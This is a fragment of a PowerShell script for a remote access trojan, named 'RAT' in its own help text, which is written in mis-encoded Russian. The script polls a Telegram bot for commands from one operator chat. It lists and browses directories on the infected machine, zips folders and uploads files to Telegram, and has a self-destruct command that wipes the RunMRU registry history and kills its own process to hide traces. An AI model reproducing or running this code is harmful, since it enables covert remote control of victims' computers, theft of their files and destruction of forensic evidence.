        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –ø–∞–ø–∫—É
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: $newDir"
                                    continue
                                }
                            }
                            
                            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –Ω–æ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å –ø–æ–º–æ—â—å—é /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # –ê—Ä—Ö–∏–≤–∏—Ä—É–µ–º –ø–∞–ø–∫—É
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "–ü–∞–ø–∫–∞ $target –∑–∞–∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞–Ω–∞" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "–û—à–∏–±–∫–∞ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –ø–∞–ø–∫–∏: $target"
                                    }
                                } else {
                                    Send-Telegram "–§–∞–π–ª $target –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω" $fullPath
                                }
                            } else {
                                Send-Telegram "–§–∞–π–ª/–ø–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "üîÑ –ó–∞–ø—É—Å–∫ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è..."
                            
                            try {
                                # –ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å—Ç—Ä–æ–µ–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –æ—á–∏—Å—Ç–∫–∏
                                $cleanupResult = Invoke-Cleanup
                                
                                if ($cleanupResult) {
                                    # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –æ—Ç–ø—Ä–∞–≤–∫—É —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
                                    Start-Sleep -Seconds 3
                                    
                                    # –ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å
                                    Stop-Process -Id $pid -Force
                                }
                                
                            } catch {
                                Send-Telegram "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–∏: $($_.Exception.Message)"
                                
                                # –ê–≤–∞—Ä–∏–π–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch {
                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
